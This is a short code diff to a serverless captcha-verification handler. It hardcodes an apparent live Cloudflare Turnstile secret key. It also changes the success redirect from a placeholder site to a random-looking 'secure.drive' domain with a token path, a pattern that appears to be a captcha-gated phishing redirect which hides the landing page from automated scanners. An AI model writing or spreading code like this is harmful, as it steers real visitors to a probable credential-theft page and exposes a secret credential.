@@ -4,7 +4,7 @@ export default async function handler(req, res) {
   }
 
   const token = req.body['cf-turnstile-response'];
-  const secret = 'your_secret_key_here'; // Replace with your actual Cloudflare secret key
+  const secret = '0x4AAAAAABbs53vI2-31uSYvjF7tov1KMlA'; // Replace with your actual Cloudflare secret key
 
   const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
     method: 'POST',
@@ -16,7 +16,7 @@ export default async function handler(req, res) {
 
   if (data.success) {
     // 🔁 This is how we trigger a redirect from server
-    res.writeHead(302, { Location: 'https://www.mywebsite.com' });
+    res.writeHead(302, { Location: 'https://secure.drive.admindoandhsevefile.space/hKYUcWCu' });
     res.end();
   } else {
     res.status(401).json({ error: 'Captcha verification failed' });
